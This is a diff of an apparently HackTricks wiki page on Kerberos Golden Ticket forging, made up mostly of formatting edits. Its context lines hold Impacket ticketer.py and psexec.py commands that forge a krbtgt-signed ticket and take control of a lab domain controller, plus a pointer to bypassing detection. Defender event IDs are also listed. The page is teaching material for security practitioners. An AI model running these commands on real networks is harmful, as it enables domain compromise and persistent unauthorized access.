@@ -1,6 +1,6 @@
 # Golden Ticket
 
-{{#include ../../banners/hacktricks-training.md}}
+\{{#include ../../banners/hacktricks-training.md\}}
 
 ## Golden ticket
 
@@ -10,13 +10,13 @@ To **acquire the NTLM hash** of the krbtgt account, various methods can be emplo
 
 Although the NTLM hash serves as a viable method for this purpose, it is **strongly recommended** to **forge tickets using the Advanced Encryption Standard (AES) Kerberos keys (AES128 and AES256)** for operational security reasons.
 
-```bash:From Linux
+```bash:from
 python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
 export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
 python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
 ```
 
-```bash:From Windows
+```bash:from
 # Rubeus
 ## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
 ## The /printcmd option will print the complete command if later you want to generate a token offline
@@ -50,24 +50,21 @@ Unfortunately, the TGT's lifetime is not logged in 4769's, so you won't find thi
 
 In order to **bypass this detection** check the diamond tickets:
 
-{{#ref}}
-diamond-ticket.md
-{{#endref}}
+\{{#ref\}}\
+diamond-ticket.md\
+\{{#endref\}}
 
 ### Mitigation
 
-- 4624: Account Logon
-- 4672: Admin Logon
-- `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`
+* 4624: Account Logon
+* 4672: Admin Logon
+* `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`
 
 Other little tricks defenders can do is **alert on 4769's for sensitive users** such as the default domain administrator account.
 
 ## References
 
-- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
-- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets] (https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
+* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
+* \[https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets] (https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
 
-{{#include ../../banners/hacktricks-training.md}}
-
-
-
+\{{#include ../../banners/hacktricks-training.md\}}
